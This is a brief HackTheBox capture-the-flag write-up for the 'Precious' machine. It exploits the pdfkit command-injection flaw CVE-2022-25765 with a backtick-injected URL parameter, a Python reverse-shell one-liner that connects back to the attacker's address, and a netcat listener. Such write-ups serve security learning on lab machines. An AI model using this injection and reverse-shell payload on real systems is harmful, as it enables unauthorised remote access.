---
title: HTB:Precious
date: 2023-11-19 21:41:37
tags:
---

# Precious

Created: February 21, 2023 9:15 PM
Parent item: HackTheBox (https://www.notion.so/HackTheBox-6dbc14645a5943aab73ab7c0d22c7d74?pvs=21)
URL: 10.10.11.189

ip==10.10.11.189

tun0==10.10.14.26

pdfkit v0.8.7

[Command Injection in pdfkit | CVE-2022-25765 | Snyk](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)

```php
irb(main):060:0> puts PDFKit.new("http://example.com/?name=#{'%20`sleep 5`'}").command wkhtmltopdf --quiet [...] 
"http://example.com/?name=%20`sleep 5`" - => nil
PDFKit.new("http://example.com/?name=#{'%20`sleep 5`'}").to_pdf # 5 seconds wait...
```

python -m http.server 8080

```php
"http://10.10.14.26:8080/?name=%20`sleep 5`" 
```

[PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)

```php
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
http://10.10.14.26:8080/?name=%20`python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.26",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`
#nc -lvnp 1234 
```



![Screenshot_2023-02-21_04_38_17](../images/Screenshot_2023-02-21_04_38_17-17004013930836.png)

![Screenshot_2023-02-21_05_39_45](../images/Screenshot_2023-02-21_05_39_45-17004013963287.png)

![Screenshot_2023-02-21_07_46_40](../images/Screenshot_2023-02-21_07_46_40-17004013996568.png)

![Screenshot_2023-02-21_07_54_23](../images/Screenshot_2023-02-21_07_54_23-17004014024909.png)

![Screenshot_2023-02-21_08_02_08](../images/Screenshot_2023-02-21_08_02_08-170040140473210.png)

![Screenshot_2023-02-21_08_08_20](../images/Screenshot_2023-02-21_08_08_20-170040140747711.png)

![Screenshot_2023-02-21_08_10_34](../images/Screenshot_2023-02-21_08_10_34-170040141086712.png)
